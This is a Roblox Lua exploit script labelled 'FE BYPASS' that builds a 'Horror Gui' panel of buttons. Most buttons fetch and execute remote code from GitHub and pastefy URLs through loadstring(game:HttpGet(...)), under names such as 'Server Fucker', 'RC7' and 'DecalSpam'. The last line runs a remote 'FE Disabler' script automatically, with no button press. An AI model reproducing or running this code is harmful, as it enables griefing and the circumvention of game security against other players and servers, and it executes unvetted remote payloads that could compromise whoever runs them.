--FE BYPASS

local S33d = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local TextLabel = Instance.new("TextLabel")
local skybox = Instance.new("TextButton")
local music = Instance.new("TextButton")
local particle = Instance.new("TextButton")
local disco = Instance.new("TextButton")
local message = Instance.new("TextButton")
local ImageLabel = Instance.new("ImageLabel")
local decal = Instance.new("TextButton")
local TextLabel_2 = Instance.new("TextLabel")
local sp = Instance.new("TextButton")
local ImageLabel_2 = Instance.new("ImageLabel")
local grab = Instance.new("TextButton")
local devuzi = Instance.new("TextButton")

S33d.Name = "S33d"
S33d.Parent = game.CoreGui
S33d.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
S33d.ResetOnSpawn = false

Frame.Parent = S33d
Frame.Active = true
Frame.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderColor3 = Color3.fromRGB(0, 102, 0)
Frame.BorderSizePixel = 3
Frame.Position = UDim2.new(0.475671828, 0, 0.308606774, 0)
Frame.Size = UDim2.new(0, 469, 0, 302)
Frame.Draggable = true

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.Size = UDim2.new(0, 468, 0, 49)
TextLabel.Font = Enum.Font.SourceSans
TextLabel.Text = "Horror Gui"
TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

skybox.Name = "skybox"
skybox.Parent = Frame
skybox.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
skybox.BorderColor3 = Color3.fromRGB(0, 102, 0)
skybox.BorderSizePixel = 3
skybox.Position = UDim2.new(0, 0, 0.162251666, 0)
skybox.Size = UDim2.new(0, 156, 0, 50)
skybox.Font = Enum.Font.SourceSans
skybox.Text = "Grab Knife"
skybox.TextColor3 = Color3.fromRGB(255, 255, 255)
skybox.TextScaled = true
skybox.TextSize = 14.000
skybox.TextWrapped = true
skybox.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/retpirato/Roblox-Scripts/refs/heads/master/Grab%20Knife%20V4.lua"))()
end)
music.Name = "music"
music.Parent = Frame
music.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
music.BorderColor3 = Color3.fromRGB(0, 102, 0)
music.BorderSizePixel = 3
music.Position = UDim2.new(0.331939369, 0, 0.162251651, 0)
music.Size = UDim2.new(0, 156, 0, 49)
music.Font = Enum.Font.SourceSans
music.Text = "DecalSpam"
music.TextColor3 = Color3.fromRGB(255, 255, 255)
music.TextScaled = true
music.TextSize = 14.000
music.TextWrapped = true
music.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastefy.app/mquqjCCe/raw"))()
end)
particle.Name = "particle"
particle.Parent = Frame
particle.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
particle.BorderColor3 = Color3.fromRGB(0, 102, 0)
particle.BorderSizePixel = 3
particle.Position = UDim2.new(0.666010916, 0, 0.162251651, 0)
particle.Size = UDim2.new(0, 156, 0, 49)
particle.Font = Enum.Font.SourceSans
particle.Text = "Exser New"
particle.TextColor3 = Color3.fromRGB(255, 255, 255)
particle.TextScaled = true
particle.TextSize = 14.000
particle.TextWrapped = true
particle.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/gitluau/luauexser/refs/heads/main/pHzp8uG1PO962o6qucrlP3AJy17eV3B.lua"))()
end)
disco.Name = "disco"
disco.Parent = Frame
disco.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
disco.BorderColor3 = Color3.fromRGB(0, 102, 0)
disco.BorderSizePixel = 3
disco.Position = UDim2.new(0, 0, 0.327814579, 0)
disco.Size = UDim2.new(0, 155, 0, 43)
disco.Font = Enum.Font.SourceSans
disco.Text = "MLG Gun"
disco.TextColor3 = Color3.fromRGB(255, 255, 255)
disco.TextScaled = true
disco.TextSize = 14.000
disco.TextWrapped = true
disco.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://gist.githubusercontent.com/zupersponge/8c39ed77f2817679294d70aff18d479d/raw/ed5e04b72c4fa77b8bf522d7275abf64ae585416/MLG%20Gun%20Script%20ROBLOX"))()
end)
message.Name = "message"
message.Parent = Frame
message.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
message.BorderColor3 = Color3.fromRGB(0, 102, 0)
message.BorderSizePixel = 3
message.Position = UDim2.new(0.330490381, 0, 0.327814579, 0)
message.Size = UDim2.new(0, 153, 0, 43)
message.Font = Enum.Font.SourceSans
message.Text = "Music Play"
message.TextColor3 = Color3.fromRGB(255, 255, 255)
message.TextScaled = true
message.TextSize = 14.000
message.TextWrapped = true
message.MouseButton1Down:connect(function()
--Made by Servano

	local s = Instance.new("Sound")

	s.Name = "Sound"
	s.SoundId = "http://www.roblox.com/asset/?id=1840490160"
	s.Volume = 100
	s.Pitch = 1
	s.Looped = true
	s.archivable = false

	s.Parent = game.Workspace

	wait(1)

	s:play()
end)
ImageLabel.Parent = Frame
ImageLabel.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel.BackgroundTransparency = 1.000
ImageLabel.BorderSizePixel = 2
ImageLabel.Position = UDim2.new(0.949803591, 0, 0.0922175497, 0)
ImageLabel.Size = UDim2.new(0, 60, 0, 57)
ImageLabel.ZIndex = 62
ImageLabel.Image = "rbxassetid://96459816781174"

decal.Name = "decal"
decal.Parent = Frame
decal.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
decal.BorderColor3 = Color3.fromRGB(0, 102, 0)
decal.BorderSizePixel = 3
decal.Position = UDim2.new(0.665245175, 0, 0.327814579, 0)
decal.Size = UDim2.new(0, 156, 0, 43)
decal.Font = Enum.Font.SourceSans
decal.Text = "RC7 Cloud"
decal.TextColor3 = Color3.fromRGB(255, 255, 255)
decal.TextScaled = true
decal.TextSize = 14.000
decal.TextWrapped = true
decal.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastefy.app/jRt7YcVc/raw"))()
end)
TextLabel_2.Parent = Frame
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.Position = UDim2.new(0.00213219621, 0, 0.88410598, 0)
TextLabel_2.Size = UDim2.new(0, 468, 0, 35)
TextLabel_2.Font = Enum.Font.SourceSans
TextLabel_2.Text = "Made By UNKNOW"
TextLabel_2.TextColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true

sp.Name = "sp"
sp.Parent = Frame
sp.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
sp.BorderColor3 = Color3.fromRGB(0, 102, 0)
sp.BorderSizePixel = 3
sp.Position = UDim2.new(0, 0, 0.470198661, 0)
sp.Size = UDim2.new(0, 155, 0, 43)
sp.Font = Enum.Font.SourceSans
sp.Text = "Server Fucker"
sp.TextColor3 = Color3.fromRGB(255, 255, 255)
sp.TextScaled = true
sp.TextSize = 14.000
sp.TextWrapped = true
sp.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastefy.app/W7YGye2A/raw"))()
end)
ImageLabel_2.Parent = Frame
ImageLabel_2.AnchorPoint = Vector2.new(0.5, 0.5)
ImageLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
ImageLabel_2.BackgroundTransparency = 1.000
ImageLabel_2.BorderSizePixel = 0
ImageLabel_2.Position = UDim2.new(0.500244141, 0, 0.5002895, 0)
ImageLabel_2.Size = UDim2.new(0, 466, 0, 301)
ImageLabel_2.ZIndex = 0
ImageLabel_2.Image = "rbxassetid://96459816781174"

grab.Name = "grab"
grab.Parent = Frame
grab.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
grab.BorderColor3 = Color3.fromRGB(0, 102, 0)
grab.BorderSizePixel = 3
grab.Position = UDim2.new(0.334754795, 0, 0.470198661, 0)
grab.Size = UDim2.new(0, 154, 0, 43)
grab.Font = Enum.Font.SourceSans
grab.Text = "RC7"
grab.TextColor3 = Color3.fromRGB(255, 255, 255)
grab.TextScaled = true
grab.TextSize = 14.000
grab.TextWrapped = true
grab.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7"))()
end)
devuzi.Name = "devuzi"
devuzi.Parent = Frame
devuzi.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
devuzi.BorderColor3 = Color3.fromRGB(0, 102, 0)
devuzi.BorderSizePixel = 3
devuzi.Position = UDim2.new(0.667377353, 0, 0.470198661, 0)
devuzi.Size = UDim2.new(0, 154, 0, 43)
devuzi.Font = Enum.Font.SourceSans
devuzi.Text = "Tubers93"
devuzi.TextColor3 = Color3.fromRGB(255, 255, 255)
devuzi.TextScaled = true
devuzi.TextSize = 14.000
devuzi.TextWrapped = true
devuzi.MouseButton1Down:connect(function()
loadstring(game:HttpGet("https://pastefy.app/WTFwlHdC/raw"))()
end)

loadstring(game:HttpGet("https://raw.githubusercontent.com/DERKOLEMA/scripts-4/refs/heads/main/FE%20Disabler.lua"))()